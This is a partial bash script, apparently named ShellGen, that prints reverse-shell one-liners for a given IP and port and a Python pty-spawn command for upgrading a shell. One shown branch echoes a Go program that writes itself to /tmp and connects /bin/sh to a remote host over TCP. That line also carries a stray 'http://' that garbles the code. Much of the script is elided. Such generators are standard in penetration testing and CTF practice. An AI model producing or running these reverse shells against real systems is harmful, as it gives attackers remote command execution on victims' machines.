...
# ShellGen generates : 		1. Reverse Shell taking <IP> and <port_no> as the user parameter
#	  	       		2. Python/Python3 pty
...
if [ "$1" == "python" ] && [ $# == "1" ]; then
...
elif [ "$1" == "python3" ] && [ $# == "1" ]; then
	echo -e "\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"

elif [ $# != '2' ]; then
	echo -e "\nUsage : ./ShellGen.sh <ip> <port>\n\n\t\tOR\t\t\n\nUsage : ./ShellGen.sh python3/python (to spawn pty shell)\n"
	...
	if [ $choice == "1" ]; then
		...
		echo -e "\necho 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","$1:$2");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;http://cmd.Run();}'>/tmp/sh.go&&go run /tmp/sh.go\n"
